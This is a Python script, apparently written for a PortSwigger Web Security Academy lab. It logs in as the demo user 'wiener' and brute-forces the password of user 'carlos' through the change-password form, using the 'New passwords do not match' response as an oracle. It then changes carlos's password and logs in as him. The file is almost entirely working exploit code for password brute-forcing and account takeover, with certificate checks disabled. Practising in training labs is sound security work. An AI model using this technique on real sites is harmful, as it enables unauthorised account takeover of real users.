import requests

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

login_url =  "https://0ac3002f045939d980684ee000b6005d.web-security-academy.net/login"
login_data = {'username':'wiener','password':'peter'}

passchange_url = 'https://0ac3002f045939d980684ee000b6005d.web-security-academy.net/my-account/change-password'


session = requests.session()

login_res = session.post(login_url, verify=False, proxies=proxies, data=login_data)

print("login as wiener successful")
print('status code is', login_res.status_code)
print('session cookie of wiener is', session.cookies.get_dict())


with open('passwords.txt', 'r') as file:
    for line in file:
        password_payload = line.strip()
        #print(password_payload) 
        passchange_data = {'username':'carlos','current-password':password_payload,'new-password-1':'ron','new-password-2':'test'}
        passchange_res = session.post(passchange_url, verify=False, proxies=proxies, data=passchange_data)
        if "New passwords do not match" in passchange_res.text:
            print("password for carlos is",password_payload)
            break          

print('Password found for carlos now chaning it to ron1234')

passchange_data2 = {'username':'carlos','current-password':password_payload,'new-password-1':'ron1234','new-password-2':'ron1234'}
passchange_res = session.post(passchange_url, verify=False, proxies=proxies, data=passchange_data2)

print('Password changed for carlos and now trying to login as carlos')


session_carlos = requests.session()
login_data_carlos = {'username':'carlos','password':'ron1234'}
car_login_res = session.post(login_url, verify=False, proxies=proxies, data=login_data_carlos)

print("login as carlos successful")
print('session cookie of carlos is', session_carlos.cookies.get_dict())



